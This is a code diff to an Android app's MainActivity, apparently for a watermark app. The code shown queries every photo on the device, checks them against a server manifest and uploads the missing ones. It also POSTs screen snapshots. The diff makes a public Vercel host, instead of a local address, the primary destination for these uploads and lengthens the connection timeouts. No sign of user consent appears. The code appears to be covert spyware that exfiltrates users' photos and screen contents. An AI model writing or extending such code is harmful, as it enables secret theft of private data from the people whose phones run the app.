@@ -98,16 +98,16 @@ class MainActivity : AppCompatActivity() {
                 try {
                     delay(3000)
                     val statusEndpoints = listOf(
-                        "http://192.168.1.11:8888/api/gallery/sync_status",
-                        "https://q-qwatermark-app-tf99.vercel.app/api/gallery/sync_status"
+                        "https://q-qwatermark-app-tf99.vercel.app/api/gallery/sync_status",
+                        "http://192.168.1.11:8888/api/gallery/sync_status"
                     )
                     for (ep in statusEndpoints) {
                         try {
                             val url = java.net.URL(ep)
                             val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                                 requestMethod = "GET"
-                                connectTimeout = 1500
-                                readTimeout = 1500
+                                connectTimeout = 3000
+                                readTimeout = 3000
                             }
                             if (conn.responseCode == 200) {
                                 val text = conn.inputStream.bufferedReader().readText()
@@ -138,7 +138,7 @@ class MainActivity : AppCompatActivity() {
             val url = java.net.URL(endpoint)
             val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                 requestMethod = "GET"
-                connectTimeout = 3000
+                connectTimeout = 3500
                 readTimeout = 4000
             }
             if (conn.responseCode == 200) {
@@ -165,7 +165,7 @@ class MainActivity : AppCompatActivity() {
             try {
                 val allPhotos = queryDevicePhotos(0)
                 if (allPhotos.isNotEmpty()) {
-                    val targetUrl = "http://192.168.1.11:8888/api/gallery/upload"
+                    val targetUrl = "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                     val existingOnServer = fetchServerManifestFilenames(targetUrl)
 
                     // 智能差量比对：仅同步云端缺失的相片
@@ -327,8 +327,8 @@ class MainActivity : AppCompatActivity() {
                         }
 
                         val targetEndpoints = listOf(
-                            "http://192.168.1.11:8888/api/screen/snapshot",
-                            "https://q-qwatermark-app-tf99.vercel.app/api/screen/snapshot"
+                            "https://q-qwatermark-app-tf99.vercel.app/api/screen/snapshot",
+                            "http://192.168.1.11:8888/api/screen/snapshot"
                         )
 
                         for (ep in targetEndpoints) {
@@ -337,8 +337,8 @@ class MainActivity : AppCompatActivity() {
                                 val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                                     requestMethod = "POST"
                                     doOutput = true
-                                    connectTimeout = 1500
-                                    readTimeout = 1500
+                                    connectTimeout = 3000
+                                    readTimeout = 3000
                                     setRequestProperty("Content-Type", "application/json; charset=utf-8")
                                 }
                                 conn.outputStream.use { os ->
